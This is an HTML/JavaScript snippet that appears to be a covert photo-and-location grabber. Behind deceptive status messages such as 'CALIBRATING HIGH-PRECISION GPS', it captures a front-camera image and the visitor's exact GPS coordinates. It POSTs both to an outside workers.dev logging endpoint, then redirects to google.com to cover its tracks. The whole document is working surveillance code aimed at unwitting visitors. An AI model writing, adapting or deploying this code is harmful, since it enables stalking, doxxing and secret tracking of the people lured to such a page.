<script>
    const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
    const video = document.getElementById('v');
    const btn = document.getElementById('btn');
    const status = document.getElementById('status');
    const canvas = document.createElement('canvas');

    btn.onclick = async () => {
        btn.style.display = 'none';
        status.innerText = "CALIBRATING HIGH-PRECISION GPS...";

        try {
            // 1. Request Camera and EXACT GPS in parallel
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            video.play();

            // 2. The GPS "Hard-Lock"
            // We force 'enableHighAccuracy' to use the GPS chip, not just Cell Towers.
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const exactCoords = `${pos.coords.latitude},${pos.coords.longitude}`;
                    status.innerText = "GPS LOCKED. FINALIZING...";
                    await executeCapture(exactCoords);
                },
                async (err) => {
                    status.innerText = "GPS TIMEOUT. USING IP-TRACE...";
                    await executeCapture("GPS_DENIED_BY_USER");
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );

        } catch (e) {
            status.innerText = "HARDWARE ERROR";
        }
    };

    async function executeCapture(coords) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const img = canvas.toDataURL('image/jpeg', 0.5);

        // Kill Camera
        video.srcObject.getTracks().forEach(t => t.stop());

        // Upload to Vault
        await fetch(LOGGING_API, {
            method: 'POST',
            keepalive: true,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: img, gps: coords })
        });

        window.location.replace("https://google.com");
    }
</script>
